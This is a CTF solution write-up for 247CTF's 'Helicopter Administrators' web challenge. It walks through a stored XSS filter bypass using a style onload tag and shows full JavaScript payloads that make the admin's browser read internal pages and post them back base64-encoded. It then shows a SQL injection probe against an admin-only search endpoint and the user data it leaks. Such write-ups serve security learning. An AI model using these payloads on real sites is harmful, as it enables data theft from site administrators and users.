# :game_die: Helicopter Administrators - 247CTF solution writeup

---

# Helicopter Administrators — 247CTF solution writeup

Hello guys, I am Adithya M S, a guy passionate about exploring hidden endpoints in web services and trying to dig deep into them. Starting today, I shall be bringing out a whole new series of writeups based on Capture the Flag security challenges of 247CTFHelicopter Administrators from 247CTF is a really beautiful challenge which combines our XSS (Cross Site Scripting)and SQLi (SQL injections). I had an enthralling experience solving it, and learnt about various ways in which XSS payloads could be injected other than just the traditional <script>alert(1)</script>

I planned on making a writeup blog on this challenge as I could not find any good quality blog on this challenge (all the blogs I found were in other languages such as Chinese etc)

If you don’t know what these terms mean, XSS occurs when user generated content is able to trigger JavaScript execution on a web page and SQLi occurs when user generated content or values submitted by a user in input fields causes execution of malicious SQL queries and some information about the results of this query are returned to the client. This was just a brief overview. If you want to get a deeper insight on these topics, there are many blogs available on the internet from where you may learn

So, let’s get right into it…

Please give me claps 👏 if you liked the blog post and follow me to see more such detailed and insightful writeups from me

Let us first create our own instance of this challenge by logging into 247ctf.com and selecting the web section, after which we look for Helicopter Administrators and select it. Now click on the“Start Challenge” button to start a new instance. The URL of my instance is [https://33c88596e07515c6.247ctf.com](https://33c88596e07515c6.247ctf.com/) (I shall stop this instance after finishing this blog)

*Starting our own instance of the challenge*

*Web page of our challenge*

You may see upon opening the challenge instance that it is a kind of social media application, where users can post comments on others’ profiles and also report other users to the admin

User 1 is highlighted here which means this is a page corresponding to the user 1 of this web app. Also notice that the address bar of the browser shows /user/1 which means the URL for user 1’s page is /user/1 relative to the website’s root URL /

Similarly, upon clicking on User 2 and User 3, notice the URLs shown on the browser

Clicking on Admin, gives a page with the message

Error: You are not an administrator on an authorised network!

*Trying to access admin page*

So, what do all these buttons on the top of the page point to ? To understand this, let’s see the source code of this page

*Snippet of the source code of user 1’s web page*

Observe that the href attribute of the link element with Admin written in it, points to [https://33c88596e07515c6.247ctf.com/user/0](https://33c88596e07515c6.247ctf.com/user/0) and when we click on this we end up at the URL[https://33c88596e07515c6.247ctf.com/user/1](https://33c88596e07515c6.247ctf.com/user/1) with the Error message showing at the top

This means we are getting redirected to /user/1 upon visiting this link due to a redirect response from the server, due to inappropriate authorisation

That’s because we are not visiting from an authorised network as an administrator

Next, let us try commenting on User 1’s profile

*Showing network request and commenting user interface side by side*

Notice the POST request being sent to [https://33c88596e07515c6.247ctf.com/comment/1](https://33c88596e07515c6.247ctf.com/comment/1) when we click on the Submit Comment button of the popup here. The 1 after the /comment part is the same as the 1 you see in the user’s page URL. This means that the number at the end of this URL identifies which user you want to add a comment to. The Content-Type response header gives us application/json, which ,means that we are getting a JSON response to this request

We may observe the payload and response of this request by going to their respective tabs.

*Payload sent in the network request*

*Response to the POST request mentioned above*

The response shown in the screenshot above indicates that the comment has been added to the user’s profile successfully

To make this process easier for us, let us use the Postman tool to send the HTTP requests.

Let us add a comment to User 1 by sending a POST request to /comment/1

We need to send the comment parameter as a application/x-www-form-urlencoded form field.

*A screenshot illustrating how to send a comment through Postman as a form field*PS: Please do’nt mind the different hex numbers at the start of domains in different screenshots. This is because this is a long blog and I had to write it in multiple sittings. Shall make all the domains same later if possible!

You can apply all these steps I discuss here on the one instance that you start.

Ok, now what if we try clicking on the Report User button ?

This is the popup message that you shall come across

*Screenshot of Report page confirmation*

These points are direct hints provided to us by the challenge authors. Administrators will view the user’s page and all the comments on the user’s page get removed after that. Also they view it from theor own internal network only. Hmm, the admin page /user/0 seems to be accessible only from an internal network as we have seen before right ?

The administrator, since he/she would be using a browser would execute JavaScript on the user’s page. What if we try injecting JavaScript throgh our comment ? This method of controlling the JavaScript executed on a client in a website is called Cross Site Scripting (XSS)

Let’s try the script tag

*Result of trying to add a comment with a script tag*

Hmm, the site does not allow this content to be placed as a comment on the user’s page as it contains potentially malicious JavaScript. This website seems to have some filters in place to place user inputted content on a page that others view.

After quite a bit of research and trying a lot of other tags (which you guys need not as the blacklist is explicitly given now, probably a recently added feature in the challenge), I found that <style> tag does the trick

*Result of using style tag to add a comment*

Wow, that was nice!! When you visit the page of User 1 at /user/1, we immediately get the alert popup (onload is an event listener attribute)

## Get Adithya M S’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

This means, we can make the admin execute whatever JavaScript we want and exfiltrate sensitive data by writing JavaScript to send requests related to posting on other users’ pages with some sensitive data

Let us make the admin user POST a comment to /user/3 with the contents of his page (i.e /user/0). But this page may have HTML that is filtered by our server. How to get the contents of this page then ? A nice idea to do this is to convert the HTML text of the document to base64.

The XSS payload to acheive this is as follows

```
<style onload='
var xhr = new XMLHttpRequest();
xhr.open("GET", "/user/0", false); // Synchronous request to avoid redirects
xhr.onreadystatechange = function() {
if (xhr.readyState === XMLHttpRequest.DONE) {
console.log("Response Code:", xhr.status); // Print the response code
if (xhr.status === 200) {
var base64Data = btoa(xhr.responseText);
var xhr2 = new XMLHttpRequest();
xhr2.open("POST", "/comment/3", true);
xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr2.send("comment=Hello from :" + document.domain + "\n" + encodeURIComponent(base64Data));
}
}
};
xhr.send();
'></style>
```

Now we comment this payload on User 1’s page. Note that the payload has the JavaScript to base64 encode /user/0 content and then POST it to /comment/3 so that we can see it on User 3’s page

For the admin to view this page and execute JavaScript, we need to report User 1. You may send a GET request to the endpoint /user/1 to acheive this.

Now, we get the following base64 content for the admin page

```
Hello from :127.0.0.1
PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8bGluayBocmVmPSIvc3RhdGljL2Jvb3RzdHJhcC5taW4uY3NzIiByZWw9InN0eWxlc2hlZXQiIGlkPSJib290c3RyYXAtY3NzIj4KICA8bGluayBocmVmPSIvc3RhdGljL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8c2NyaXB0IHNyYz0iL3N0YXRpYy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0iL3N0YXRpYy9ib290c3RyYXAubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0iL3N0YXRpYy9zY3JpcHQuanMiPjwvc2NyaXB0PgogIDx0aXRsZT5BZG1pbmlzdHJhdG9yJ3MgcHJvZmlsZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CiAgPGRpdiBjbGFzcz0ibWFpbi1jb250ZW50Ij4KICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZXhwYW5kLWxnIG5hdmJhci1saWdodCBiZy1saWdodCI+CiAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiBtci1hdXRvIj4KICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gYWN0aXZlIj4KICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Imh0dHA6Ly8xMjcuMC4wLjE6NTAwMC91c2VyLzAiPkFkbWluPC9hPgogICAgICA8L2xpPiB8CiAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gIj4KICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Imh0dHA6Ly8xMjcuMC4wLjE6NTAwMC91c2VyLzEiPlVzZXIgMTwvYT4KICAgICAgPC9saT4gfCAKICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSAiPgogICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iaHR0cDovLzEyNy4wLjAuMTo1MDAwL3VzZXIvMiI+VXNlciAyPC9hPgogICAgICA8L2xpPiB8CiAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gIj4KICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Imh0dHA6Ly8xMjcuMC4wLjE6NTAwMC91c2VyLzMiPlVzZXIgMzwvYT4KICAgICAgPC9saT4KICAgIDwvdWw+CiAgPC9uYXY+CiAgCiAgCiAgCiAgPGRpdiBjbGFzcz0iY29udGFpbmVyIG10LTciPgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgPGRpdiBjbGFzcz0iY29sLXhsLTggbS1hdXRvIG9yZGVyLXhsLTIgbWItNSBtYi14bC0wIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIGNhcmQtcHJvZmlsZSBzaGFkb3ciPgogICAgICAgICAgPGRpdiBjbGFzcz0icm93IGp1c3RpZnktY29udGVudC1jZW50ZXIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMyBvcmRlci1sZy0yIj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXByb2ZpbGUtaW1hZ2UiPgogICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9zdGF0aWMvaW1nLnN2ZyIgY2xhc3M9InJvdW5kZWQtY2lyY2xlIGNpcmNsZS1zaXplIj4KICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIHRleHQtY2VudGVyIGJvcmRlci0wIHB0LTggcHQtbWQtNCBwYi0wIHBiLW1kLTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXgganVzdGlmeS1jb250ZW50LWJldHdlZW4iPgogICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tZGVmYXVsdCBtci00IHAtMiIgZGF0YS10b2dnbGU9Im1vZGFsIiBkYXRhLXRhcmdldD0iI2NvbW1lbnRNb2RhbCI+Q29tbWVudDwvYnV0dG9uPgogICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tZGVmYXVsdCBmbG9hdC1yaWdodCBwLTIiIGRhdGEtdG9nZ2xlPSJtb2RhbCIgZGF0YS10YXJnZXQ9IiNyZXBvcnRNb2RhbCI+UmVwb3J0PC9idXR0b24+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkgcHQtMCBwdC1tZC0yIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1wcm9maWxlLXN0YXRzIGQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIG10LW1kLTUiPgogICAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJoZWFkaW5nIj4xMDA8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImRlc2NyaXB0aW9uIj5GcmllbmRzPC9zcGFuPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgPGRpdj4KICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaGVhZGluZyI+MTAwPC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJkZXNjcmlwdGlvbiI+TGlrZXM8L3NwYW4+CiAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJoZWFkaW5nIj4xMDA8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImRlc2NyaXB0aW9uIj5TaGFyZXM8L3NwYW4+CiAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgPGgzPgogICAgICAgICAgICAgICAgQWRtaW5pc3RyYXRvcgogICAgICAgICAgICAgIDwvaDM+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaDUgZm9udC13ZWlnaHQtMzAwIj4KICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJuaSBtci0yIj48L2k+TmV3IFlvcmssIFVTQQogICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgIAogICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im10LTI1Ij4KICAgICAgICAgICAgICAgIDxmb3JtIGNsYXNzPSJuYXZiYXItZm9ybSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249Ii9zZWNyZXRfYWRtaW5fc2VhcmNoIiBjb21tZW50PSIjc2VhcmNoLXJlc3BvbnNlIj4KICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ic2VhcmNoLXJlc3BvbnNlIiBjbGFzcz0iZGVzY3JpcHRpb24iPjwvZGl2PgogICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCI+ICAgIAogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIGRlc2NyaXB0aW9uIiBpZD0ic2VhcmNoIiBuYW1lPSJzZWFyY2giPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC1idG4iPgogICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBzZWFyY2giIHZhbHVlPSJVc2VyIElEIFNlYXJjaCI+CiAgICAgICAgICAgICAgICAgICAgPC9zcGFuPiAKICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgPC9kaXY+CjwvZGl2Pgo8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0iY29tbWVudE1vZGFsIiB0YWJpbmRleD0iLTEiIHJvbGU9ImRpYWxvZyIgYXJpYS1sYWJlbGxlZGJ5PSJjb21tZW50TW9kYWxDZW50ZXJUaXRsZSIgYXJpYS1oaWRkZW49InRydWUiPgogIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyBtb2RhbC1kaWFsb2ctY2VudGVyZWQgbW9kYWwtbGciIHJvbGU9ImRvY3VtZW50Ij4KICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQiPgogICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPgogICAgICAgIDxoNSBjbGFzcz0ibW9kYWwtdGl0bGUiIGlkPSJjb21tZW50TW9kYWxMb25nVGl0bGUiPkNyZWF0ZSBDb21tZW50PC9oNT4KICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImNsb3NlIiBkYXRhLWRpc21pc3M9Im1vZGFsIiBhcmlhLWxhYmVsPSJDbG9zZSI+CiAgICAgICAgICA8c3BhbiBhcmlhLWhpZGRlbj0idHJ1ZSI+JnRpbWVzOzwvc3Bhbj4KICAgICAgICA8L2J1dHRvbj4KICAgICAgPC9kaXY+CiAgICAgIDxmb3JtIHJvbGU9ImZvcm0iIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIvY29tbWVudC8wIiBpZD0iY29tbWVudF9mb3JtIiBjb21tZW50PSIjY29tbWVudC1yZXNwb25zZSI+CiAgICAgICA8ZGl2IGlkPSJjb21tZW50LXJlc3BvbnNlIiBjbGFzcz0ibXQtNCBtbC00IG1yLTQiPjwvZGl2PgogICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtYm9keSBjb21tZW50Ij4KICAgICAgICAgU3VibWl0IGEgY29tbWVudCB0byBiZSBkaXNwbGF5ZWQgb24gdGhlIHVzZXIncyBwcm9maWxlOgogICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48dGV4dGFyZWEgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImNvbW1lbnQiIG5hbWU9ImNvbW1lbnQiIHJvd3M9IjUiPjwvdGV4dGFyZWE+PC9kaXY+CiAgICAgICA8L2Rpdj4KICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20gcC0yIiB2YWx1ZT0iU3VibWl0IENvbW1lbnQiPgogICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1kZWZhdWx0IGJ0bi1zbSBwLTIiIGRhdGEtZGlzbWlzcz0ibW9kYWwiPkNsb3NlIENvbW1lbnQ8L2J1dHRvbj4KICAgICAgPC9kaXY+CiAgICA8L2Zvcm0+CiAgPC9kaXY+CjwvZGl2Pgo8L2Rpdj4KPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9InJlcG9ydE1vZGFsIiB0YWJpbmRleD0iLTEiIHJvbGU9ImRpYWxvZyIgYXJpYS1sYWJlbGxlZGJ5PSJyZXBvcnRNb2RhbENlbnRlclRpdGxlIiBhcmlhLWhpZGRlbj0idHJ1ZSI+CiAgPGRpdiBjbGFzcz0ibW9kYWwtZGlhbG9nIG1vZGFsLWRpYWxvZy1jZW50ZXJlZCBtb2RhbC1sZyIgcm9sZT0iZG9jdW1lbnQiPgogICAgPGRpdiBjbGFzcz0ibW9kYWwtY29udGVudCI+CiAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciI+CiAgICAgICAgPGg1IGNsYXNzPSJtb2RhbC10aXRsZSIgaWQ9InJlcG9ydE1vZGFsTG9uZ1RpdGxlIj5SZXBvcnQgVXNlcjwvaDU+CiAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJjbG9zZSIgZGF0YS1kaXNtaXNzPSJtb2RhbCIgYXJpYS1sYWJlbD0iQ2xvc2UiPgogICAgICAgICAgPHNwYW4gYXJpYS1oaWRkZW49InRydWUiPiZ0aW1lczs8L3NwYW4+CiAgICAgICAgPC9idXR0b24+CiAgICAgIDwvZGl2PgogICAgICA8Zm9ybSByb2xlPSJmb3JtIiBtZXRob2Q9IkdFVCIgYWN0aW9uPSIvcmVwb3J0LzAiIGlkPSJyZXBvcnRfZm9ybSIgY29tbWVudD0iI3JlcG9ydC1yZXNwb25zZSI+CiAgICAgICAgPGRpdiBpZD0icmVwb3J0LXJlc3BvbnNlIiBjbGFzcz0ibXQtNCBtbC00IG1yLTQiPjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPgogICAgICAgICAgPHAgY2xhc3M9ImNvbW1lbnQiPkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byByZXBvcnQgdGhpcyB1c2VyPzwvcD4KICAgICAgICAgIDxwIGNsYXNzPSJjb21tZW50Ij5BbiBhZG1pbmlzdHJhdG9yIHdpbGwgaW52ZXN0aWdhdGUgYWxsIHJlcG9ydGVkIHByb2ZpbGVzIGZvciBpbmFwcHJvcHJpYXRlIGNvbnRlbnQuPC9wPgogICAgICAgICAgPHAgY2xhc3M9ImNvbW1lbnQgZm9udC1pdGFsaWMgbXQtMyI+Tm90ZToKICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgIDxsaSBjbGFzcz0iY29tbWVudCBmb250LWl0YWxpYyBzaXplZCI+QWRtaW5pc3RyYXRvcnMgYXJlIHNlY3VyaXR5IGNvbnNjaW91cywgdGhleSBhY2Nlc3MgdGhlIHNpdGUgZnJvbSBhbiBpbnRlcm5hbCBzeXN0ZW0gb24gYW4gaW50ZXJuYWwgbmV0d29yayB3aGljaCBkb2VzIG5vdCBoYXZlIG91dGJvdW5kIEludGVybmV0IGFjY2VzczwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJjb21tZW50IGZvbnQtaXRhbGljIHNpemVkIj5BZG1pbmlzdHJhdG9ycyBhcmUgYWdncmVzc2l2ZSwgb25jZSB0aGV5IGhhdmUgdmlld2VkIGEgcHJvZmlsZSBhbGwgY29tbWVudHMgd2lsbCBiZSBkZWxldGVkPC9saT4KICAgICAgICAgICAgICA8bGkgY2xhc3M9ImNvbW1lbnQgZm9udC1pdGFsaWMgc2l6ZWQiPkFkbWluaXN0cmF0b3JzIGFyZSBhY3RpdmUsIHRoZXkgd2lsbCByZXZpZXcgYWxsIHJlcG9ydGVkIHByb2ZpbGVzIGltbWVkaWF0ZWx5PC9saT4KICAgICAgICAgICAgICA8bGkgY2xhc3M9ImNvbW1lbnQgZm9udC1pdGFsaWMgc2l6ZWQiPkFkbWluaXN0cmF0b3JzIGFyZSBpbXBhdGllbnQsIHRoZXkgd2lsbCBub3Qgc3BlbmQgbW9yZSB0aGFuIGEgZmV3IHNlY29uZHMgb24gYSBwcm9maWxlPC9saT4KICAgICAgICAgICAgICA8bGkgY2xhc3M9ImNvbW1lbnQgZm9udC1pdGFsaWMgc2l6ZWQiPkFkbWluaXN0cmF0b3JzIGFyZSBsYXp5LCB0aGV5IHdpbGwgbm90IGludGVyYWN0IHdpdGggdGhlIHByb2ZpbGUsIGJ1dCB0aGV5IHdpbGwgdmlldyBpdDwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJjb21tZW50IGZvbnQtaXRhbGljIHNpemVkIj5BZG1pbmlzdHJhdG9ycyBhcmUgbWVtb3J5IGh1bmdyeSwgdGhleSBhbHdheXMgdXNlIENocm9tZSBiYXNlZCBicm93c2VyczwvbGk+CiAgICAgICAgICAgICAgPGxpIGNsYXNzPSJjb21tZW50IGZvbnQtaXRhbGljIHNpemVkIj5BZG1pbmlzdHJhdG9ycyBhcmUgc2ltcGxlLCB0aGV5IGRvbid0IGxpa2UgZmFuY3kgSFRNTCBhbmltYXRpb25zPC9saT4KICAgICAgICAgICAgPC91bD4KICAgICAgICAgIDwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1mb290ZXIganVzdGlmeS1jb250ZW50LWJldHdlZW4iPgogICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20gcC0yIiB2YWx1ZT0iU3VibWl0IFJlcG9ydCI+CiAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20gcC0yIiBkYXRhLWRpc21pc3M9Im1vZGFsIj5DbG9zZSBSZXBvcnQ8L2J1dHRvbj4KICAgICAgICA8L2Rpdj4KICAgICAgPC9mb3JtPgogICAgPC9kaXY+CiAgPC9kaXY+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=
```

Decoding this content (except for the Hello message of course) on any online Base64 decoder gives us,

```
<!DOCTYPE html>
<html>
<head>
<link href="/static/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<link href="/static/style.css" rel="stylesheet">
<script src="/static/jquery.min.js"></script>
<script src="/static/bootstrap.min.js"></script>
<script src="/static/script.js"></script>
<title>Administrator's profile</title>
</head>
<body>
<div class="main-content">
<nav class="navbar navbar-expand-lg navbar-light bg-light">
<ul class="navbar-nav mr-auto">
<li class="nav-item active">
<a class="nav-link" href="http://127.0.0.1:5000/user/0">Admin</a>
</li> |
<li class="nav-item ">
<a class="nav-link" href="http://127.0.0.1:5000/user/1">User 1</a>
</li> |
<li class="nav-item ">
<a class="nav-link" href="http://127.0.0.1:5000/user/2">User 2</a>
</li> |
<li class="nav-item ">
<a class="nav-link" href="http://127.0.0.1:5000/user/3">User 3</a>
</li>
</ul>
</nav>

<div class="container mt-7">
<div class="row">
<div class="col-xl-8 m-auto order-xl-2 mb-5 mb-xl-0">
<div class="card card-profile shadow">
<div class="row justify-content-center">
<div class="col-lg-3 order-lg-2">
<div class="card-profile-image">
<img src="/static/img.svg" class="rounded-circle circle-size">
</div>
</div>
</div>
<div class="card-header text-center border-0 pt-8 pt-md-4 pb-0 pb-md-2">
<div class="d-flex justify-content-between">
<button type="button" class="btn btn-sm btn-default mr-4 p-2" data-toggle="modal" data-target="#commentModal">Comment</button>
<button type="button" class="btn btn-sm btn-default float-right p-2" data-toggle="modal" data-target="#reportModal">Report</button>
</div>
</div>
<div class="card-body pt-0 pt-md-2">
<div class="row">
<div class="col">
<div class="card-profile-stats d-flex justify-content-center mt-md-5">
<div>
<span class="heading">100</span>
<span class="description">Friends</span>
</div>
<div>
<span class="heading">100</span>
<span class="description">Likes</span>
</div>
<div>
<span class="heading">100</span>
<span class="description">Shares</span>
</div>
</div>
</div>
</div>
<div class="text-center">
<h3>
Administrator
</h3>
<div class="h5 font-weight-300">
<i class="ni mr-2"></i>New York, USA
</div>

<div class="mt-25">
<form class="navbar-form" method="POST" action="/secret_admin_search" comment="#search-response">
<div id="search-response" class="description"></div>
<div class="input-group">
<input type="text" class="form-control description" id="search" name="search">
<span class="input-group-btn">
<input type="submit" class="btn btn-default search" value="User ID Search">
</span>
</div>
</form>
</div>

</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="commentModal" tabindex="-1" role="dialog" aria-labelledby="commentModalCenterTitle" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title" id="commentModalLongTitle">Create Comment</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">&times;</span>
</button>
</div>
<form role="form" method="POST" action="/comment/0" id="comment_form" comment="#comment-response">
<div id="comment-response" class="mt-4 ml-4 mr-4"></div>
<div class="modal-body comment">
Submit a comment to be displayed on the user's profile:
<div class="form-group"><textarea class="form-control" id="comment" name="comment" rows="5"></textarea></div>
</div>
<div class="modal-footer justify-content-between">
<input type="submit" class="btn btn-default btn-sm p-2" value="Submit Comment">
<button type="button" class="btn btn-default btn-sm p-2" data-dismiss="modal">Close Comment</button>
</div>
</form>
</div>
</div>
</div>
<div class="modal fade" id="reportModal" tabindex="-1" role="dialog" aria-labelledby="reportModalCenterTitle" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title" id="reportModalLongTitle">Report User</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">&times;</span>
</button>
</div>
<form role="form" method="GET" action="/report/0" id="report_form" comment="#report-response">
<div id="report-response" class="mt-4 ml-4 mr-4"></div>
<div class="modal-body">
<p class="comment">Are you sure you want to report this user?</p>
<p class="comment">An administrator will investigate all reported profiles for inappropriate content.</p>
<p class="comment font-italic mt-3">Note:
<ul>
<li class="comment font-italic sized">Administrators are security conscious, they access the site from an internal system on an internal network which does not have outbound Internet access</li>
<li class="comment font-italic sized">Administrators are aggressive, once they have viewed a profile all comments will be deleted</li>
<li class="comment font-italic sized">Administrators are active, they will review all reported profiles immediately</li>
<li class="comment font-italic sized">Administrators are impatient, they will not spend more than a few seconds on a profile</li>
<li class="comment font-italic sized">Administrators are lazy, they will not interact with the profile, but they will view it</li>
<li class="comment font-italic sized">Administrators are memory hungry, they always use Chrome based browsers</li>
<li class="comment font-italic sized">Administrators are simple, they don't like fancy HTML animations</li>
</ul>
</p>
</div>
<div class="modal-footer justify-content-between">
<input type="submit" class="btn btn-default btn-sm p-2" value="Submit Report">
<button type="button" class="btn btn-default btn-sm p-2" data-dismiss="modal">Close Report</button>
</div>
</form>
</div>
</div>
</div>
</body>
</html>
```

We can find a form with a POST method to endpoint “/secret_admin_search” and by noticing the input fields of the form, we may notice that there is a field with name search that seems to take a user id and return search results

```
<style onload='
var xhr = new XMLHttpRequest();
xhr.open("POST", "/secret_admin_search", true); // POST request to /secret_admin_search
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.onreadystatechange = function() {
if (xhr.readyState === XMLHttpRequest.DONE) {
if (xhr.status === 200) {
var base64Data = btoa(xhr.responseText);
var xhr2 = new XMLHttpRequest();
xhr2.open("POST", "/comment/3", true); // POST the result to /comment/3
xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr2.send("comment=Hello from :" + document.domain + "\n" + encodeURIComponent(base64Data));
}
}
};
xhr.send("search=flag"); // Form parameter for the search request
'></style>
```

We use this generic payload to exfiltrate responses of secret_admin_search endpoint which can be accessed only by the admin throgh a local network

We get the response

```
Hello from :127.0.0.1
eyJtZXNzYWdlIjoiU1FMaXRlIGVycm9yOiBubyBzdWNoIGNvbHVtbjogZmxhZyIsInJlc3VsdCI6ImVycm9yIn0K
```

Decoding this gives us the error message:

```
{"message":"SQLite error: no such column: flag","result":"error"}
```

This shows us that our input is directly included as part of an SQL query. This indicates a possible SQL injection vulnerability. Let’s now exploit this by using our XSS payload (modifying it a bit)

Let us search for 1 OR 1=1 — (Just change the last line of the previous payload in the SQL injections that follow)

```
xhr.send("search=1 OR 1=1--");
```

We get the following decoded content

```
{"message":[[0,"Administrator",100,100,100,"New York, USA"],[1,"Michael Owens",14,22,3,"Sydney, Australia"],[2,"Alice Brock",72,132,28,"Amsterdam, Nederland"],[3,"Sally Alterman",3,1,0,"Berlin, Germany"]],"result":"success"}
```

